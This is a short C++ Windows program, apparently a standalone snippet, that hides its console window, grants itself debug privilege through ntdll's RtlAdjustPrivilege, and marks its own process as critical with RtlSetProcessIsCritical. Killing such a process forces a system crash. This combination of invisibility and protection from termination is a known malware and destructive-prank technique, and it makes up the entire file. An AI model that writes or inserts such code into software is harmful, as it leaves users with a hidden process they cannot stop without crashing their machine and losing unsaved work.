#include "SetProcessIsCritical.h"

int main() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    auto hNtdll = LoadLibraryA("ntdll.dll");
    if (hNtdll == nullptr) {
        FreeLibrary(hNtdll);
        return ERROR_BAD_ENVIRONMENT;
    }

    auto RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege) GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    BOOLEAN enabled;
    if (RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &enabled) != 0) {
        FreeLibrary(hNtdll);
        return ERROR_ACCESS_DENIED;
    }

    auto RtlSetProcessIsCritical = (pdef_RtlSetProcessIsCritical) GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
    FreeLibrary(hNtdll);
    BOOLEAN OldValue;
    return RtlSetProcessIsCritical(TRUE, &OldValue, FALSE);
}
